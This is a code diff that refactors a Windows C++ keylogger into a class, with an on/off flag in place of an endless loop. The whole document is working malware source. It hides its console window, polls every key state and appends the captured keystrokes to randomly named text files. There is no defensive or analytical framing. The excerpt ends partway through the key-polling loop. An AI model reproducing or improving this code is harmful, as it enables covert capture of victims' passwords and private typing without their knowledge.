@@ -1,16 +1,8 @@
 #define _WIN32_WINNT 0x0500
 #include "keylogger.h"
-#include <Windows.h>
-#include <fstream>
-#include <string>
-#include <iostream>
-#include <random> 
-#include <vector>
-
-using namespace std;
 
 //Create random file name
-std::string generate_random_string(size_t length) {
+std::string keylogger::generate_random_string(size_t length) {
     const std::string characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
     static std::mt19937 generator(std::random_device{}());
     std::uniform_int_distribution<size_t> distribution(0, characters.length() - 1);
@@ -23,9 +15,7 @@ std::string generate_random_string(size_t length) {
 }
 
 // Append string to log file
-void LOG(const string& input) {
-    string path="../data/keylogger/";
-    path+=generate_random_string(10)+".txt";
+void keylogger::LOG(const string& input) {
     ofstream logFile(path, ios::app);
     if (logFile.is_open()) {
         logFile << input;
@@ -34,7 +24,7 @@ void LOG(const string& input) {
 }
 
 // Handle special keys
-bool HandleSpecialKey(int keyCode) {
+bool keylogger::HandleSpecialKey(int keyCode) {
     switch (keyCode) {
         case VK_SPACE:      LOG(" "); return true;
         case VK_RETURN:     LOG("\n"); return true;
@@ -55,17 +45,18 @@ bool HandleSpecialKey(int keyCode) {
 }
 
 // Check if key is printable ASCII
-bool IsPrintable(int key) {
+bool keylogger::IsPrintable(int key) {
     return (key >= 32 && key <= 126);
 }
 
-void Keylogger() {
+void keylogger::Keylogger() {
     // Hide console window
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     LOG("\n[Keylogger Started]\n");
 
-    while (true) {
+
+    while (keyloggerON) {
         Sleep(10); // Avoid CPU overuse
 
         for (int key = 8; key <= 190; ++key) {
